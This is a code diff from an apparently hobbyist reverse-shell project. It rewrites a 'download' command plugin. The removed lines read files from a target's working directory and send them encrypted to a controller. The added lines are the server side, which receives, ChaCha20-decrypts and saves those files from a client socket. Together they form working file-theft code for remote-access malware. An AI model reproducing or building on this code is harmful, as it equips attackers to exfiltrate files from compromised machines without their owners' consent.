@@ -1,46 +1,36 @@
-package obs1d1anc1ph3r.reverseshell.plugins;
+package obs1d1anc1ph3r.reverseshell.server.plugins;
 
-import java.io.File;
-import obs1d1anc1ph3r.reverseshell.ServerConnection;
-import obs1d1anc1ph3r.reverseshell.utils.FileTransferService;
+import java.io.DataInputStream;
+import java.io.DataOutputStream;
+import java.net.Socket;
+import obs1d1anc1ph3r.reverseshell.server.encryption.ChaCha20;
+import obs1d1anc1ph3r.reverseshell.server.utils.FileSaver;
 
 public class DownloadCommand implements CommandPlugin {
 
-	private static String currentDir = System.getProperty("user.dir");
-	private ServerConnection serverConnection;
+	private final FileSaver fileSaver = new FileSaver();
 
 	@Override
-	public String getCommandName() {
-		return "download";
-	}
+	public void execute(DataInputStream dataIn, DataOutputStream dataOut, byte[] encryptionKey, Socket clientSocket) throws Exception {
+		String fileName = dataIn.readUTF(); //File name
+		int nonceLength = dataIn.readInt(); //Nonce length
 
-	@Override
-	public String execute(String[] args) {
-		if (args.length == 0) {
-			return "Error: No file specified for download.";
+		if (nonceLength <= 0 || nonceLength > 32) {
+			throw new Exception("Invalid nonce length: " + nonceLength); //Bad length
+		}
+		byte[] receivedNonce = new byte[nonceLength]; //Get nonce
+		dataIn.readFully(receivedNonce); //Do the thing
+
+		int fileLength = dataIn.readInt(); //Get data size
+		if (fileLength <= 0) {
+			throw new Exception("Invalid file length received: " + fileLength);
 		}
 
-		//Get the directory from the CDCommand, idk if this is the best way to do it, but it works (I think)
-		currentDir = CDCommand.getCurrentDirectory();
-		String filePath = args[0];
-		File file = new File(currentDir, filePath);
-		System.out.println("[DEBUG] Attempting to download file: " + file.getAbsolutePath());
+		byte[] encryptedFileBytes = new byte[fileLength]; //Make a byte array the size of the received stuff
+		dataIn.readFully(encryptedFileBytes); //Read the encrypted bytes
 
-		if (!file.exists() || !file.isFile()) {
-			return "Error: File not found at " + file.getAbsolutePath();
-		}
+		byte[] fileBytes = ChaCha20.decrypt(encryptionKey, receivedNonce, encryptedFileBytes); //Decrypt it
 
-		try {
-			//Basically just pass on the responsability
-			FileTransferService fileTransferService = new FileTransferService();
-			fileTransferService.sendEncryptedFile(file, serverConnection);
-			return "";
-		} catch (Exception e) {
-			return "Error: Unable to send file: " + e.getMessage();
-		}
-	}
-
-	public void setServerConnection(ServerConnection serverConnection) {
-		this.serverConnection = serverConnection;
+		fileSaver.saveFile(fileBytes, clientSocket, fileName); //I don't wanna deal with this anymore
 	}
 }
